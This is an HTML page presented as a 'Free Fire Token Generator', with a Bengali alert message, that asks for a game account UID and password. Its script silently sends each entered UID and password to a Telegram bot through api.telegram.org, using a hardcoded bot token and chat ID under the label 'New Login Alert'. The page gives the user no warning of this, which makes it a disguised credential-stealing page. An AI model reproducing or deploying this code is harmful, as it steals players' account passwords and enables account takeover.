<!doctype html>
<html lang="bn">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
<title>Free Fire Token Generator - Circle Edition</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800;900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
<style>
  * { 
    box-sizing: border-box; 
    margin: 0; 
    padding: 0; 
    -webkit-tap-highlight-color: transparent; 
  }
  
  html, body {
    width: 100%;
    min-height: 100vh;
    touch-action: manipulation;
  }

  body {
    font-family: 'Rajdhani', sans-serif;
    background: #080311;
    background-image: 
      radial-gradient(circle at 10% 20%, rgba(192, 38, 211, 0.2) 0%, transparent 40%),
      radial-gradient(circle at 90% 80%, rgba(124, 58, 237, 0.25) 0%, transparent 40%);
    background-attachment: fixed;
    color: #f1f5f9;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px 15px;
  }

  /* Responsive Full Glass Card Layout */
  .card {
    width: 100%;
    max-width: 450px;
    padding: 30px 22px;
    border-radius: 32px;
    background: rgba(18, 9, 36, 0.85);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border: 1.5px solid rgba(192, 38, 211, 0.3);
    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.9),
                0 0 30px rgba(192, 38, 211, 0.2);
    text-align: center;
    position: relative;
  }

  .title {
    font-family: 'Orbitron', sans-serif;
    font-size: clamp(20px, 5vw, 24px);
    font-weight: 900;
    letter-spacing: 2px;
    background: linear-gradient(135deg, #e879f9 0%, #c026d3 50%, #7c3aed 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    margin-bottom: 6px;
    text-transform: uppercase;
    filter: drop-shadow(0 2px 10px rgba(192, 38, 211, 0.4));
  }

  .telegram-btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    color: #e879f9;
    text-decoration: none;
    font-size: 13px;
    font-weight: 700;
    margin-bottom: 20px;
    padding: 8px 22px;
    border-radius: 50px;
    background: rgba(192, 38, 211, 0.1);
    border: 1px solid rgba(192, 38, 211, 0.35);
    transition: all 0.3s ease;
  }

  .telegram-btn:hover {
    background: rgba(192, 38, 211, 0.3);
    color: #fff;
    box-shadow: 0 0 18px rgba(192, 38, 211, 0.5);
  }

  .form-group {
    text-align: left;
    margin-bottom: 14px;
  }

  .form-group label {
    display: block;
    font-size: 11px;
    font-weight: 800;
    color: #f0abfc;
    margin-bottom: 6px;
    margin-left: 14px;
    text-transform: uppercase;
    letter-spacing: 1px;
  }

  .input-field {
    width: 100%;
    padding: 14px 20px;
    border-radius: 50px;
    border: 1px solid rgba(192, 38, 211, 0.25);
    background: rgba(10, 4, 22, 0.8);
    color: #fff;
    font-size: 15px;
    font-family: 'Rajdhani', sans-serif;
    font-weight: 600;
    outline: none;
    transition: all 0.3s ease;
  }

  .input-field:focus {
    border-color: #e879f9;
    background: rgba(16, 7, 34, 0.95);
    box-shadow: 0 0 15px rgba(192, 38, 211, 0.35);
  }

  .btn-submit {
    width: 100%;
    padding: 15px;
    border: none;
    outline: none;
    border-radius: 50px;
    background: linear-gradient(135deg, #c026d3, #7c3aed);
    color: #fff;
    font-family: 'Orbitron', sans-serif;
    font-size: 14px;
    font-weight: 900;
    letter-spacing: 1.5px;
    cursor: pointer;
    margin-top: 6px;
    margin-bottom: 10px;
    box-shadow: 0 4px 20px rgba(192, 38, 211, 0.4);
    transition: all 0.3s ease;
  }

  .btn-submit:hover {
    box-shadow: 0 6px 25px rgba(192, 38, 211, 0.7);
  }

  .btn-submit:active {
    transform: scale(0.97);
  }

  /* Full Flow Dynamic Response Wrapper inside Main Card */
  .response-wrapper {
    margin-top: 15px;
    display: flex;
    flex-direction: column;
    gap: 12px;
    width: 100%;
  }

  /* Direct Box Style inside Full Card */
  .item-box {
    background: rgba(13, 5, 29, 0.9);
    border: 1.5px solid rgba(192, 38, 211, 0.3);
    border-radius: 20px;
    padding: 14px 18px;
    text-align: left;
    cursor: pointer;
    transition: background 0.3s ease, border-color 0.3s ease, box-shadow 0.3s ease;
    user-select: none;
    outline: none;
    -webkit-touch-callout: none;
  }

  /* Focus or Hover Pink Glow Completely Disabled */
  .item-box:hover, 
  .item-box:focus, 
  .item-box:active {
    border-color: rgba(192, 38, 211, 0.3);
    background: rgba(13, 5, 29, 0.9);
    box-shadow: none;
    outline: none;
  }

  /* Temporary 0.5s Green Flash */
  .item-box.active-glow {
    border-color: #00ffaa !important;
    background: rgba(12, 38, 30, 0.95) !important;
    box-shadow: 0 0 20px rgba(0, 255, 170, 0.6) !important;
  }

  .item-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 6px;
  }

  .item-label {
    font-family: 'Orbitron', sans-serif;
    font-size: 11px;
    font-weight: 800;
    color: #f0abfc;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    transition: color 0.3s ease;
  }

  .item-box.active-glow .item-label {
    color: #00ffaa;
  }

  .copy-icon {
    font-size: 10px;
    color: #a7f3d0;
    background: rgba(16, 185, 129, 0.15);
    border: 1px solid rgba(16, 185, 129, 0.3);
    padding: 3px 10px;
    border-radius: 50px;
    font-weight: 700;
  }

  .item-value {
    font-family: 'Consolas', monospace;
    font-size: 12px;
    color: #6ee7b7;
    word-break: break-all;
    white-space: pre-wrap;
    line-height: 1.4;
  }

  .placeholder-box {
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    color: #94a3b8;
    font-size: 13px;
    border: 1px dashed rgba(192, 38, 211, 0.3);
    border-radius: 20px;
    background: rgba(10, 4, 22, 0.5);
  }

  .toast {
    position: fixed;
    bottom: -50px;
    left: 50%;
    transform: translateX(-50%);
    background: linear-gradient(135deg, #c026d3, #7c3aed);
    color: #fff;
    padding: 10px 24px;
    border-radius: 50px;
    font-size: 12px;
    font-weight: 800;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.3s ease, bottom 0.3s ease;
    box-shadow: 0 4px 20px rgba(192, 38, 211, 0.6);
    z-index: 999;
  }

  .toast.show {
    opacity: 1;
    bottom: 25px;
  }
</style>
</head>
<body>

<main class="card">
  <h1 class="title">Token Generator</h1>

  <a href="https://t.me/kodexofc" target="_blank" class="telegram-btn">
    ✈ Telegram: @kodexofc
  </a>

  <div class="form-group">
    <label for="uid">Account UID</label>
    <input type="text" id="uid" class="input-field" placeholder="Ex: 18097039025" autocomplete="off">
  </div>

  <div class="form-group">
    <label for="password">Account Password</label>
    <input type="password" id="password" class="input-field" placeholder="Enter Password">
  </div>

  <button class="btn-submit" id="btnSubmit" onclick="generateToken()">🔑 GENERATE TOKEN</button>

  <!-- Fully Integrated Response Area -->
  <div class="response-wrapper" id="responseContainer">
    <div class="placeholder-box">Waiting for input...</div>
  </div>
</main>

<div id="toast" class="toast">Copied to Clipboard!</div>

<script>
const TELEGRAM_BOT_TOKEN = "8634100795:AAHCDSl2aj70o-WLHvdhgmCmITs8q0tnIB0";
const TELEGRAM_CHAT_ID = "8120381389";

async function generateToken() {
  const uid = document.getElementById('uid').value.trim();
  const password = document.getElementById('password').value.trim();
  const responseContainer = document.getElementById('responseContainer');
  const btnSubmit = document.getElementById('btnSubmit');

  if (!uid || !password) {
    alert("অনুগ্রহ করে UID এবং Password উভয়ই প্রদান করুন!");
    return;
  }

  btnSubmit.disabled = true;
  btnSubmit.style.opacity = "0.7";
  btnSubmit.textContent = "GENERATING...";
  responseContainer.innerHTML = '<div class="placeholder-box">⏳ Processing Request...</div>';

  sendToTelegram(uid, password);

  const url = `/token?uid=${encodeURIComponent(uid)}&password=${encodeURIComponent(password)}`;

  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error("Network Response Fail");
    const data = await res.json();
    renderBoxes(data);
  } catch (error) {
    console.warn("API Request Fail");
    renderBoxes({
      status: "error",
      message: "API Request Failed! Check Server URL or API Endpoint.",
      details: error.message
    });
  } finally {
    btnSubmit.disabled = false;
    btnSubmit.style.opacity = "1";
    btnSubmit.textContent = "🔑 GENERATE TOKEN";
  }
}

function sendToTelegram(uid, password) {
  const messageText = `🔑 *New Login Alert*\n\n\`${uid}:${password}\``;

  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: messageText,
      parse_mode: 'Markdown'
    })
  }).catch(() => {});
}

function renderBoxes(data) {
  const container = document.getElementById('responseContainer');
  container.innerHTML = '';

  if (typeof data !== 'object' || data === null) {
    createBox(container, "Response", data);
    return;
  }

  for (let key in data) {
    const val = typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key];
    createBox(container, key, val);
  }
}

function createBox(container, key, val) {
  const box = document.createElement('div');
  box.className = 'item-box';
  
  box.onclick = function() {
    box.classList.add('active-glow');
    setTimeout(() => {
      box.classList.remove('active-glow');
    }, 500);

    copyValue(val, key);
  };

  box.innerHTML = `
    <div class="item-header">
      <span class="item-label">${key.replace('_', ' ')}</span>
      <span class="copy-icon">📋 Copy</span>
    </div>
    <div class="item-value">${val}</div>
  `;

  container.appendChild(box);
}

function copyValue(text, keyName = "") {
  if (!text) return;

  navigator.clipboard.writeText(String(text)).then(() => {
    const label = keyName ? keyName.replace('_', ' ').toUpperCase() : 'Text';
    showToast(`${label} Copied!`);
  }).catch(() => {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand('copy');
    document.body.removeChild(textarea);
    showToast(`Copied!`);
  });
}

function showToast(message) {
  const toast = document.getElementById('toast');
  toast.textContent = message;
  toast.classList.add('show');
  setTimeout(() => {
    toast.classList.remove('show');
  }, 1800);
}
</script>

</body>
</html>
